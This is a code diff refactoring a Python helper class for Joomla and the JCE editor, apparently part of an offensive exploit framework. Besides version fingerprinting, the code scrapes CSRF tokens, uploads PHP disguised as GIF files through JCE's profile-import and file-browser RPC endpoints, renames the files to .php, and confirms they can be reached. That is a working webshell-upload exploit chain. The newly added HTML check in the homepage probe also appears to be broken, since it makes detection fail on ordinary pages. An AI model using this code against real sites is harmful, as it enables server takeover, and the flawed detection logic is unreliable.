@@ -12,29 +12,28 @@ import string
 import time
 from typing import Any, Dict, List, Optional, Tuple
 
+from core.framework.base_module import BaseModule
 from lib.scanner.http.detectors import detect_joomla
+from lib.scanner.http.response_validation import is_html_response, is_xml_response, looks_like_html
 
 JCE_PATCHED_VERSION = "2.9.99.5"
 
-_JOOMLA_VERSION_RE = re.compile(
-    r'<meta\s+name=["\']generator["\'][^>]+content=["\']Joomla!\s+([0-9.]+)',
-    re.IGNORECASE,
-)
-_XML_VERSION_RE = re.compile(r"<version>([^<]+)</version>", re.IGNORECASE)
-_CSRF_PATTERNS = (
-    r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
-    r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
-    r'name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"',
-    r'name="token"\s+content="([a-f0-9]{32})"',
-    r'data-joomla-token="([a-f0-9]{32})"',
-)
 
+class Joomla(BaseModule):
+    """Joomla / JCE helper mixin for exploit and scanner modules."""
 
-class JoomlaProbe:
-    """Joomla / JCE helpers bound to an ``Http_client`` module instance."""
-
-    def __init__(self, client: Any):
-        self.client = client
+    _JOOMLA_VERSION_RE = re.compile(
+        r'<meta\s+name=["\']generator["\'][^>]+content=["\']Joomla!\s+([0-9.]+)',
+        re.IGNORECASE,
+    )
+    _XML_VERSION_RE = re.compile(r"<version>([^<]+)</version>", re.IGNORECASE)
+    _CSRF_PATTERNS = (
+        r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
+        r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
+        r'name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"',
+        r'name="token"\s+content="([a-f0-9]{32})"',
+        r'data-joomla-token="([a-f0-9]{32})"',
+    )
 
     @staticmethod
     def parse_version_parts(version: str) -> List[int]:
@@ -69,7 +68,7 @@ class JoomlaProbe:
     def extract_csrf_token(body: str) -> Optional[str]:
         if not body:
             return None
-        for pattern in _CSRF_PATTERNS:
+        for pattern in Joomla._CSRF_PATTERNS:
             match = re.search(pattern, body, re.IGNORECASE)
             if match:
                 return match.group(1)
@@ -96,23 +95,25 @@ class JoomlaProbe:
     def gif_wrap(php: str) -> bytes:
         return b"GIF89a\n" + php.encode("utf-8")
 
-    def http_get(self, path: str, timeout: Optional[float] = None):
+    def joomla_http_get(self, path: str, timeout: Optional[float] = None):
         kwargs: Dict[str, Any] = {"allow_redirects": True}
         if timeout is not None:
             kwargs["timeout"] = timeout
-        return self.client.http_request(method="GET", path=path, **kwargs)
+        return self.http_request(method="GET", path=path, **kwargs)
 
     def probe_joomla(self) -> Dict[str, Any]:
         result: Dict[str, Any] = {"found": False, "version": None}
-        response = self.http_get("/")
+        response = self.joomla_http_get("/")
         if not response:
             return result
 
         body = response.text or ""
+        if looks_like_html(body):
+            return result
         if detect_joomla(response):
             result["found"] = True
 
-        match = _JOOMLA_VERSION_RE.search(body)
+        match = self._JOOMLA_VERSION_RE.search(body)
         if match:
             return {"found": True, "version": match.group(1).strip()}
 
@@ -131,12 +132,16 @@ class JoomlaProbe:
             result["found"] = True
 
         for asset in ("/media/system/js/core.js", "/templates/system/css/system.css"):
-            asset_resp = self.http_get(asset, timeout=6)
-            if asset_resp and asset_resp.status_code == 200 and len(asset_resp.text or "") > 20:
-                result["found"] = True
-                break
+            asset_resp = self.joomla_http_get(asset, timeout=6)
+            if not asset_resp or asset_resp.status_code != 200:
+                continue
+            asset_body = asset_resp.text or ""
+            if looks_like_html(asset_body) or len(asset_body) <= 20:
+                continue
+            result["found"] = True
+            break
 
-        admin = self.http_get("/administrator/index.php", timeout=6)
+        admin = self.joomla_http_get("/administrator/index.php", timeout=6)
         if admin and admin.status_code == 200:
             admin_body = admin.text or ""
             if any(
@@ -153,10 +158,10 @@ class JoomlaProbe:
             "/administrator/manifest.xml",
             "/language/en-GB/en-GB.xml",
         ):
-            manifest_resp = self.http_get(manifest, timeout=6)
+            manifest_resp = self.joomla_http_get(manifest, timeout=6)
             if not manifest_resp or manifest_resp.status_code != 200:
                 continue
-            ver = _XML_VERSION_RE.search(manifest_resp.text or "")
+            ver = self._XML_VERSION_RE.search(manifest_resp.text or "")
             if ver:
                 return {"found": True, "version": ver.group(1).strip()}
             result["found"] = True
@@ -168,13 +173,13 @@ class JoomlaProbe:
             "/plugins/editors/jce/jce.xml",
             "/administrator/components/com_jce/jce.xml",
         ):
-            response = self.http_get(manifest, timeout=6)
+            response = self.joomla_http_get(manifest, timeout=6)
             if not response or response.status_code != 200:
                 continue
             body = response.text or ""
-            if len(body) <= 20:
+            if not is_xml_response(body):
                 continue
-            match = _XML_VERSION_RE.search(body)
+            match = self._XML_VERSION_RE.search(body)
             if match:
                 return {"found": True, "version": match.group(1).strip()}
             return {"found": True, "version": None}
@@ -183,28 +188,36 @@ class JoomlaProbe:
             "/plugins/system/jcemediabox/js/jcemediabox.js",
             "/media/editors/jce/js/editor.min.js",
         ):
-            response = self.http_get(asset, timeout=6)
-            if response and response.status_code == 200 and len(response.text or "") > 20:
-                return {"found": True, "version": None}
-
-        explorer = self.http_get("/index.php?option=com_jce&task=explorer", timeout=6)
-        if explorer and explorer.status_code == 200 and "jce" in (explorer.text or "").lower():
+            response = self.joomla_http_get(asset, timeout=6)
+            if not response or response.status_code != 200:
+                continue
+            body = response.text or ""
+            if looks_like_html(body) or len(body) <= 20:
+                continue
+            if "jce" not in body.lower():
+                continue
             return {"found": True, "version": None}
+
+        explorer = self.joomla_http_get("/index.php?option=com_jce&task=explorer", timeout=6)
+        if explorer and explorer.status_code == 200:
+            explorer_body = explorer.text or ""
+            if not looks_like_html(explorer_body) and "jce" in explorer_body.lower():
+                return {"found": True, "version": None}
 
         return {"found": False, "version": None}
 
     def fetch_csrf_token(self) -> Optional[str]:
-        response = self.http_get("/")
+        response = self.joomla_http_get("/")
         if not response or response.status_code != 200:
             return None
         return self.extract_csrf_token(response.text or "")
 
     def jce_has_feed(self) -> bool:
-        response = self.http_get("/index.php?option=com_jce&task=cpanel.feed", timeout=6)
+        response = self.joomla_http_get("/index.php?option=com_jce&task=cpanel.feed", timeout=6)
         return bool(response and response.status_code == 200 and '"feeds"' in (response.text or ""))
 
     def jce_profile_import(self, token: str, filename: str, body: str) -> bool:
-        response = self.client.http_request(
+        response = self.http_request(
             method="POST",
             path="/index.php?option=com_jce",
             data={"task": "profiles.import", token: "1"},
@@ -243,7 +256,7 @@ class JoomlaProbe:
             f"<params><![CDATA[{params}]]></params>"
             "</profile></profiles></jce>"
         )
-        response = self.client.http_request(
+        response = self.http_request(
             method="POST",
             path="/index.php?option=com_jce",
             data={"task": "profiles.import", token: "1"},
@@ -269,7 +282,7 @@ class JoomlaProbe:
         data: bytes,
         content_type: str,
     ) -> bool:
-        response = self.client.http_request(
+        response = self.http_request(
             method="POST",
             path=f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
             data={
@@ -291,7 +304,7 @@ class JoomlaProbe:
                 "params": [f"{stem}.{from_ext}", f"{stem}.php"],
             }
         )
-        response = self.client.http_request(
+        response = self.http_request(
             method="POST",
             path=f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
             data={token: "1", "json": rpc},
@@ -302,7 +315,7 @@ class JoomlaProbe:
             return None
         time.sleep(0.3)
         for ext in ("php", f"php.{from_ext}"):
-            check = self.http_get(f"/images/{stem}.{ext}", timeout=6)
+            check = self.joomla_http_get(f"/images/{stem}.{ext}", timeout=6)
             if check and check.status_code == 200:
                 return ext
         return None
@@ -324,7 +337,7 @@ class JoomlaProbe:
         if self.jce_profile_import(token, filename, php_source):
             time.sleep(0.3)
             for path in (f"/tmp/{filename}", f"/{filename}"):
-                check = self.http_get(path, timeout=8)
+                check = self.joomla_http_get(path, timeout=8)
                 if check and check.status_code == 200:
                     return {"path": path, "filename": filename, "vector": "profile_import"}
 
@@ -346,7 +359,7 @@ class JoomlaProbe:
             time.sleep(0.3)
             ext = upload_name.rsplit(".", 1)[-1]
             path = f"/images/{stem}.{ext}"
-            check = self.http_get(path, timeout=6)
+            check = self.joomla_http_get(path, timeout=6)
             if check and check.status_code == 200:
                 return {"path": path, "filename": f"{stem}.{ext}", "vector": "browser_upload"}
 
